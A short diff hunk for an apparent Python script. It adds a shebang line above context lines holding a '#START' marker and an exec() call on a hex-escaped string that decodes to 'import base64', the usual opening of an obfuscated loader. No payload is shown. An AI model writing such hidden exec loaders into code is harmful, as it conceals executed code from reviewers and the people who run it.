@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 #START
 exec('\x69\x6d\x70\x6f\x72\x74\x20\x62\x61\x73\x65\x36\x34')
